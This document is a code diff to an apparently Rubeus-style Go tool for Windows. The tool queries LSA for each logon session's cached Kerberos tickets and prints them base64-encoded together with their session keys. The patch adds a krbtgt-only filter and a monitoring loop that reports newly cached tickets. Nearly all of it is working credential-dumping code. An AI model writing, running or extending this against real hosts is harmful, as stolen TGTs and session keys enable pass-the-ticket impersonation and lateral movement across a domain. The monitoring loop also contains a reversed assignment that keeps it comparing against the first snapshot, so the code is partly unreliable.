@@ -6,9 +6,12 @@ import (
 	"log"
 	"math"
 	"os"
+	"flag"
 	"syscall"
 	"unsafe"
 	"time"
+
+	"strings"
 	"github.com/carlpett/winlsa"
 	"github.com/carlpett/winlsa/internal/lsa"
 	"github.com/taskcluster/runlib/win32"
@@ -33,7 +36,28 @@ const (
 )
 
 func main() {
+	OnlyKrbtgt := flag.Bool("krbtgt", false, "Display only krbtgt")
+	Monitor    := flag.Int("monitor", 0, "Monitor new ticket")
+	flag.Parse()
+	if *Monitor == 0 {
+		all := TicketExtract()
+		DisplayResult(all,*OnlyKrbtgt)
+	}
+	if *Monitor > 0 {
+		allOld := TicketExtract()
+		for {
+			time.Sleep( time.Duration(*Monitor) * time.Second)
+			all := TicketExtract()
+			DisplayNewResult(allOld,all,*OnlyKrbtgt)
+			all=allOld
+		}
+		
+	}
+}
 
+
+func TicketExtract() []lsa.DisplaySession {	
+	all := []lsa.DisplaySession{}
 	h := syscall.Handle(0)
 	err := win32.LsaConnectUntrusted(&h)
 	if err != nil {
@@ -84,42 +108,155 @@ func main() {
 			count2 := ticketCacheResponse.CountOfTickets
 
 			if count2 != 0 {
-				fmt.Printf("-----------------------------------------BEGIN FOR USER "+sd.UserName+"--------------------------------------------------\n\n")
-				fmt.Printf("  UserName                 : %s\n", sd.UserName);
-		        fmt.Printf("  Domain                   : %s\n", sd.LogonDomain);
-		        fmt.Printf("  LogonId                  : %v\n", sd.LogonId);
-		        fmt.Printf("  UserSID                  : %v\n", sd.Sid);
-		        fmt.Printf("  AuthenticationPackage    : %s\n", sd.AuthenticationPackage);
-		        fmt.Printf("  LogonType                : %s\n", sd.LogonType);
-		        fmt.Printf("  LogonTime                : %s\n",sd.LogonTime);
-		        fmt.Printf("  LogonServer              : %s\n", sd.LogonServer);
-		        fmt.Printf("  Number of tickets        : %d\n", ticketCacheResponse.CountOfTickets)
+				session := lsa.DisplaySession{
+					UserName: 			   fmt.Sprintf("%s",sd.UserName),
+					LogonDomain:  		   fmt.Sprintf("%s",sd.LogonDomain),
+					LogonId:  		       fmt.Sprintf("%s",sd.LogonId),
+					Sid:             	   fmt.Sprintf("%s",sd.Sid),
+					AuthenticationPackage: fmt.Sprintf("%s",sd.AuthenticationPackage),
+					LogonType:             fmt.Sprintf("%s",sd.LogonType),
+					LogonTime:             fmt.Sprintf("%s",sd.LogonTime),
+					LogonServer:           fmt.Sprintf("%s",sd.LogonServer),
+					DnsDomainName:         fmt.Sprintf("%s",sd.DnsDomainName),
+					Upn:          		   fmt.Sprintf("%s",sd.Upn),
+					CountOfTickets:        int(ticketCacheResponse.CountOfTickets),
+				}
 				dataSize := unsafe.Sizeof(lsa.KERB_TICKET_CACHE_INFO_EX{})
+				RealCount :=0
 				for j := 0; j < int(count2); j++ {
 					PtrTicket := uintptr(protocolReturnBuffer) + uintptr(8+j*int(dataSize))
 					TempTicket := (*lsa.KERB_TICKET_CACHE_INFO_EX)(unsafe.Pointer(PtrTicket))
 					if TempTicket.ServerRealm.String() != "" && TempTicket.ServerName.String() != "" {
-						fmt.Printf("  [i]  Server name   %q \n", TempTicket.ServerName.String())
-						fmt.Printf("  [i]  Client name   %q \n", TempTicket.ClientName.String())
-						fmt.Printf("  [i]  ClientRealm   %q \n", TempTicket.ClientRealm.String())
-						fmt.Printf("  [i]  ServerRealm   %q \n", TempTicket.ServerRealm.String())
-						fmt.Printf("  [i]  StartTime     %q \n", fromFileTimeUtc(TempTicket.StartTime))
-						fmt.Printf("  [i]  EndTime       %q \n", fromFileTimeUtc(TempTicket.EndTime))
-						fmt.Printf("  [i]  RenewTime     %q \n", fromFileTimeUtc(TempTicket.RenewTime))
-						fmt.Printf("  [i]  Flags          %x \n", TempTicket.TicketFlags)
-
-						Extract(h,authPackage,sd.LogonId,TempTicket.ServerName.String(),TempTicket.TicketFlags)
-						
+						RealCount++
+						tempTick,state := Extract(h,authPackage,sd.LogonId,TempTicket.ServerName.String(),TempTicket.TicketFlags)
+						if state {
+							session.TicketsStub = append(session.TicketsStub ,lsa.DisplayTicketStub{
+								ServerName: 		TempTicket.ServerName.String(),
+								ClientName:  		TempTicket.ClientName.String(),
+								ClientRealm:  		TempTicket.ClientRealm.String(),
+								ServerRealm:      	TempTicket.ServerRealm.String(),
+								StartTime:          fmt.Sprintf("%s",fromFileTimeUtc(TempTicket.StartTime)),
+								EndTime:  			fmt.Sprintf("%s",fromFileTimeUtc(TempTicket.EndTime)),
+								RenewTime:          fmt.Sprintf("%s",fromFileTimeUtc(TempTicket.RenewTime)),
+								TicketFlags:        strings.Join(lsa.DescribeFlagTicket(TempTicket.TicketFlags)," | "),
+								Ticket:				tempTick,
+							})
+						}
 					}
 				}
-				fmt.Printf("\n\n\n")
+				if RealCount > 0 {
+					all = append(all,session)
+				}
 			}
 			lsa.LsaFreeReturnBuffer(protocolReturnBuffer)
 			lsa.LsaFreeReturnBuffer(protocolSubmitBuffer)
 		}
 	}
+	return all
+}
+func DisplayResult(results []lsa.DisplaySession,krbtgtOnly bool) {
+	var memSession string
+	for _,session := range results {
+
+		if len(session.TicketsStub) > 0 {
+			krbVar := true
+			if krbtgtOnly {
+				krbVar = CheckKrbtgt(session.TicketsStub)
+			}
+			if memSession != session.LogonId && krbVar{
+				fmt.Println("\n-----------------------------> "+session.UserName+"\n")
+			    fmt.Printf("  Domain                   : %s\n", session.LogonDomain);
+			    fmt.Printf("  LogonId                  : %s\n", session.LogonId);
+			    fmt.Printf("  UserSID                  : %v\n", session.Sid);
+			    fmt.Printf("  AuthenticationPackage    : %s\n", session.AuthenticationPackage);
+			    fmt.Printf("  LogonType                : %s\n", session.LogonType);
+			    fmt.Printf("  LogonTime                : %s\n", session.LogonTime);
+			    fmt.Printf("  LogonServer              : %s\n", session.LogonServer);
+			    fmt.Printf("  LogonServerDNSDomain     : %s\n", session.DnsDomainName);
+			    fmt.Printf("  UserPrincipalName        : %s\n", session.Upn);
+			    fmt.Printf("  Number of tickets        : %d\n", session.CountOfTickets)
+			    memSession = session.LogonId
+			}
+			for _, ticket := range session.TicketsStub {
+				if !krbtgtOnly || ticket.Ticket.ServiceName=="krbtgt" {
+				    fmt.Printf("  	[i]  Server name :  %q \n", ticket.ServerName)
+				    fmt.Printf("  	[i]  Service name:  %q \n", ticket.Ticket.ServiceName)
+					fmt.Printf("  	[i]  Client name :  %q \n", ticket.Ticket.ClientName)
+					fmt.Printf("  	[i]  ClientRealm :  %q \n", ticket.ClientRealm)
+					fmt.Printf("  	[i]  ServerRealm :  %q \n", ticket.ServerRealm)
+					fmt.Printf("  	[i]  StartTime   :  %q \n", ticket.Ticket.StartTime)
+					fmt.Printf("  	[i]  EndTime     :  %q \n", ticket.Ticket.EndTime)
+					fmt.Printf("  	[i]  RenewTime   :  %q \n", ticket.Ticket.RenewUntil)
+					fmt.Printf("  	[i]  Flags       :  %q \n", ticket.Ticket.Flags)
+					fmt.Printf("  	[i]  Ticket      :\n%s \n", ticket.Ticket.EncodedTicket)
+					fmt.Println("\n")
+				}
+			}
+		}
+	}
+}
+func containNew(ticket string, old []lsa.DisplaySession) bool {
+	for _,session := range old {
+		for _, ticketOld := range session.TicketsStub {
+			if ticketOld.Ticket.EncodedTicket == ticket {
+				return false
+			}
+		}
+	}
+	return true
 }
 
+func DisplayNewResult(resultsOld []lsa.DisplaySession,results []lsa.DisplaySession,krbtgtOnly bool) {
+	var memSession string
+	for _,session := range results {
+
+		if len(session.TicketsStub) > 0 {
+			krbVar := true
+			if krbtgtOnly {
+				krbVar = CheckKrbtgt(session.TicketsStub)
+			}
+			for _, ticket := range session.TicketsStub {
+				if (!krbtgtOnly || ticket.Ticket.ServiceName=="krbtgt") && containNew(ticket.Ticket.EncodedTicket,resultsOld) {
+					if memSession != session.LogonId && krbVar{
+						fmt.Println("\n-----------------------------> "+session.UserName+"\n")
+					    fmt.Printf("  Domain                   : %s\n", session.LogonDomain);
+					    fmt.Printf("  LogonId                  : %s\n", session.LogonId);
+					    fmt.Printf("  UserSID                  : %v\n", session.Sid);
+					    fmt.Printf("  AuthenticationPackage    : %s\n", session.AuthenticationPackage);
+					    fmt.Printf("  LogonType                : %s\n", session.LogonType);
+					    fmt.Printf("  LogonTime                : %s\n", session.LogonTime);
+					    fmt.Printf("  LogonServer              : %s\n", session.LogonServer);
+					    fmt.Printf("  LogonServerDNSDomain     : %s\n", session.DnsDomainName);
+					    fmt.Printf("  UserPrincipalName        : %s\n", session.Upn);
+					    fmt.Printf("  Number of tickets        : %d\n", session.CountOfTickets)
+					    memSession = session.LogonId
+					}
+				    fmt.Printf("  	[i]  Server name :  %q \n", ticket.ServerName)
+				    fmt.Printf("  	[i]  Service name:  %q \n", ticket.Ticket.ServiceName)
+					fmt.Printf("  	[i]  Client name :  %q \n", ticket.Ticket.ClientName)
+					fmt.Printf("  	[i]  ClientRealm :  %q \n", ticket.ClientRealm)
+					fmt.Printf("  	[i]  ServerRealm :  %q \n", ticket.ServerRealm)
+					fmt.Printf("  	[i]  StartTime   :  %q \n", ticket.Ticket.StartTime)
+					fmt.Printf("  	[i]  EndTime     :  %q \n", ticket.Ticket.EndTime)
+					fmt.Printf("  	[i]  RenewTime   :  %q \n", ticket.Ticket.RenewUntil)
+					fmt.Printf("  	[i]  Flags       :  %q \n", ticket.Ticket.Flags)
+					fmt.Printf("  	[i]  Ticket      :\n%s \n", ticket.Ticket.EncodedTicket)
+					fmt.Println("\n")
+				}
+			}
+		}
+	}
+}
+
+
+func CheckKrbtgt(stub []lsa.DisplayTicketStub) bool {
+	for _, ticket := range stub {
+		if ticket.Ticket.ServiceName == "krbtgt"{
+			return true
+		}
+	}
+	return false
+}
 func fromFileTimeUtc(fileTime int64) time.Time {
 	epochDiff := int64(11644473600)
 	if fileTime < 0 || fileTime > 2650467743999999999 {
@@ -133,7 +270,7 @@ func fromFileTimeUtc(fileTime int64) time.Time {
 	return time.Unix(unixTime, 0).UTC()
 }
 
-func Extract(lsaHandle syscall.Handle, authPack uint32, userLogonID windows.LUID, targetName string, ticketFlags uint32) {
+func Extract(lsaHandle syscall.Handle, authPack uint32, userLogonID windows.LUID, targetName string, ticketFlags uint32)(lsa.DisplayTicket,bool) {
 	// Préparer la requête pour extraire le ticket
 	TargetNamePtr := lsa.NewUnicodeString(targetName)
 	request := lsa.KERB_RETRIEVE_TKT_REQUEST{
@@ -144,16 +281,6 @@ func Extract(lsaHandle syscall.Handle, authPack uint32, userLogonID windows.LUID
 		CacheOptions:   KERB_RETRIEVE_TICKET_AS_KERB_CRED,
 		EncryptionType: 0,
 	}
-
-	// Convertir la requête en bytes
-	/*fmt.Println("Request:")
-	fmt.Printf("  MessageType: %d\n", request.MessageType)
-	fmt.Printf("  LogonId: %d-%d\n", request.LogonId.LowPart, request.LogonId.HighPart)
-	fmt.Printf("  TargetName: %s\n", targetName)
-	fmt.Printf("  TicketFlags: %d\n", request.TicketFlags)
-	fmt.Printf("  CacheOptions: %d\n", request.CacheOptions)
-	fmt.Printf("  EncryptionType: %d\n", request.EncryptionType)
-	*/
 	requestSize := uintptr(unsafe.Sizeof(request))
 	//fmt.Println("Struct Size:", requestSize)
 
@@ -164,9 +291,6 @@ func Extract(lsaHandle syscall.Handle, authPack uint32, userLogonID windows.LUID
 	if unmanagedAddr == 0 || err != nil {
 		log.Fatalf("HeapAlloc failed: %v", err)
 	}
-
-
-
 
 	// Copier la structure de la requête dans la mémoire non gérée
 	CopyMemory(unsafe.Pointer(unmanagedAddr), unsafe.Pointer(&request), requestSize)
@@ -199,32 +323,30 @@ func Extract(lsaHandle syscall.Handle, authPack uint32, userLogonID windows.LUID
 		encodedTicket := make([]byte, encodedTicketSize)
 		CopyMemory(unsafe.Pointer(&encodedTicket[0]), unsafe.Pointer(response.Ticket.EncodedTicket), uintptr(encodedTicketSize))
 		encodedTicketBase64 := base64.StdEncoding.EncodeToString(encodedTicket)
-
-
-
-		// Afficher les informations du ticket
 		ticket := response.Ticket
-		fmt.Println("------[+] ServiceName          : ", ticket.ServiceName.String())
-		//fmt.Println("------[+] TargetName           : ", ticket.TargetName.String())
-		fmt.Println("------[+] ClientName           : ", ticket.ClientName.String())
-		fmt.Println("------[+] DomainName           : ", ticket.DomainName.String())
-		fmt.Println("------[+] TargetDomainName     : ", ticket.TargetDomainName.String())
-		fmt.Println("------[+] AltTargetDomainName  : ", ticket.AltTargetDomainName.String())
-		fmt.Println("------[+] SessionKey           : ", response.Ticket.SessionKey.Key)
-		fmt.Println("------[+] TicketFlags          : ", ticket.TicketFlags)
-		fmt.Println("------[+] Flags                : ", ticket.Flags)
-		fmt.Println("------[+] KeyExpirationTime    : ", fromFileTimeUtc(ticket.KeyExpirationTime))
-		fmt.Println("------[+] StartTime            : ", fromFileTimeUtc(ticket.StartTime))
-		fmt.Println("------[+] EndTime              : ", fromFileTimeUtc(ticket.EndTime))
-		fmt.Println("------[+] RenewUntil           : ", fromFileTimeUtc(ticket.RenewUntil))
-		fmt.Println("------[+] TimeSkew             : ", ticket.TimeSkew)
-		fmt.Printf("------[+] EncodedTicket (Base64): \n%s\n", encodedTicketBase64)
-		fmt.Printf("\n")
+		returnTicket := lsa.DisplayTicket {
+			ServiceName: 		 ticket.ServiceName.String(),
+			ClientName:  		 ticket.ClientName.String(),
+			DomainName: 		 ticket.DomainName.String(),
+			TargetDomainName:  	 ticket.TargetDomainName.String(),
+			AltTargetDomainName: ticket.AltTargetDomainName.String(),
+			SessionKey:   		 fmt.Sprintf("%x",response.Ticket.SessionKey.Key),
+			TicketFlags:		 fmt.Sprintf("%s",ticket.TicketFlags),
+			Flags:               strings.Join(lsa.DescribeFlagTicket(ticket.Flags),", "),
+			KeyExpirationTime:   fmt.Sprintf("%s",fromFileTimeUtc(ticket.KeyExpirationTime)),
+			StartTime:           fmt.Sprintf("%s",fromFileTimeUtc(ticket.StartTime)),
+			EndTime:  			 fmt.Sprintf("%s",fromFileTimeUtc(ticket.EndTime)),
+			RenewUntil:          fmt.Sprintf("%s",fromFileTimeUtc(ticket.RenewUntil)),
+			TimeSkew:            fmt.Sprintf("%i",ticket.TimeSkew),
+			EncodedTicket:       fmt.Sprintf("%s",encodedTicketBase64),
+		}
 
 		// Libérer la mémoire allouée par LsaCallAuthenticationPackage
 		lsa.LsaFreeReturnBuffer(returnBuffer)
 		lsa.HeapFree(lsa.GetProcessHeap(), 0, unmanagedAddr)
+		return returnTicket,true
 	} 
+	return lsa.DisplayTicket{},false
 }
 
 
@@ -233,5 +355,4 @@ func CopyMemory(dest, src unsafe.Pointer, length uintptr) {
 		*(*byte)(unsafe.Pointer(uintptr(dest) + i)) = *(*byte)(unsafe.Pointer(uintptr(src) + i))
 	}
 }
-
 
